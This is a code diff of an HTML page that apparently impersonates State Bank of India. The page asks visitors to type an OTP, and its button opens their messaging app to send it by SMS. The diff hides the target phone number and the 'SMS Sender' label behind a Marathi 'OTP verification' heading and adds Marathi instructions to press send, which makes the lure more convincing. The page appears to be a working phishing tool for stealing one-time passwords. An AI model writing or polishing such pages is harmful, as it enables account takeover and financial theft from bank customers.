@@ -46,10 +46,10 @@
 <body>
     <div class="container">
         <img src="./sbilogo.png" alt="Girl in a jacket"  width="220" height="160">
-        <h2>SMS Sender</h2>
-        <p>Number: +919767785187</p>
-        <input type="text" id="otp" placeholder="OTP daalein (e.g., 526251)">
-        <button onclick="sendSMS()">SMS Bhejo</button>
+        <h2>OTO Verification</h2>
+        <p>मोबाईल नंबर पुष्टी प्रणाली</p>
+        <input type="text" id="otp" placeholder="OTP टाका (e.g., 526251)">
+        <button onclick="sendSMS()">ओटीपी पाठवा </button>
         <p id="status"></p>
     </div>
 
@@ -109,7 +109,7 @@
             
             try {
                 window.location.href = smsLink;
-                status.textContent = 'Messaging app khul gaya hai. SMS bhejne ke liye send button dabayein.';
+                status.textContent = 'मेसेजिंग अ्ॅप उघण्यात आले आहे.SMS पाठवण्या करिता सेंड बटन वर दाबा <br>  Messaging app khul gaya hai. SMS bhejne ke liye send button dabayein.';
             } catch (error) {
                 status.textContent = 'SMS trigger karne mein error: ' + error.message;
             }
